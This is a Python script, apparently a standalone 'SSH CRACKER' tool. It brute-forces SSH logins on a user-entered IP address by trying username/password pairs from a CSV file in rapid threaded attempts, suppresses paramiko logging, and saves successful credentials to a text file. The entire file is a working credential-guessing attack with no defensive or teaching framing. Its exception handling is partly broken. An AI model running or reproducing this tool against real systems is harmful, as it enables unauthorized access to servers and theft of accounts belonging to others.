from colorama import Fore, init
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
from tqdm import tqdm
import time
import csv
import ipaddress
import threading
import time
import logging
import pyfiglet
import os
import urllib.request

def connect(host="https://google.com/"):
	try:
		urllib.request.urlopen(host)
		return True
	except:
		return False
if connect() == True:
    os.system("cls")
    for i in tqdm(range(10), colour="green", desc="loading software"):
        pass
        time.sleep(1.00)


    os.system("cls")
    name = "SSH CRACKER"
    ascii_banner = pyfiglet.figlet_format(f"{name}")
    print(ascii_banner)


    def ssh(host, username, password):
        ssh_client = SSHClient()
        ssh_client.set_missing_host_key_policy(AutoAddPolicy())
        try:
            ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)

            with open("credentials_found.txt", "a") as fh:
                print(f"{Fore.GREEN}Username - {username} and Password - ******* found.")
                
                fh.write(f"Username: {Fore.GREEN} {username} {Fore.RESET}\nPassword: {Fore.GREEN} {password} {Fore.RESET}\nWorked on host: {host}\n\n")

        except AuthenticationException:
            with open("Wrong_credentials.txt", "a") as fh:
                print(f"{Fore.RED}Username - {username} and Password - ******* is Incorrect.")
                
                fh.write(f"Username: {username}\nPassword: {password}\nDidnt work on host: {host}\n\n")

        except ssh.SSHException:
            print(f"{Fore.RED}**** Attempting to connect - Rate limiting on server ****")


    def get_ip_address():
        while True:
            host = input("Please enter the host ip address: ")
            try:
                ipaddress.IPv4Address(host)
                return host
            except ipaddress.AddressValueError:
                print("Please enter a valid ip address.")


    def __main__():
        logging.getLogger("paramiko.transport").addHandler(NullHandler())
        list_file = "passwords.csv"
        host = get_ip_address()
        with open(list_file) as fh:
            csv_reader = csv.reader(fh, delimiter=",")
            for index, row in enumerate(csv_reader):
                if index == 0:
                    continue
                else:
                    t = threading.Thread(
                        target=ssh,
                        args=(
                            host,
                            row[0],
                            row[1],
                        ),
                    )
                    t.start()
                    time.sleep(0.2)
    __main__()
else:   
    print("Please connect to the internet")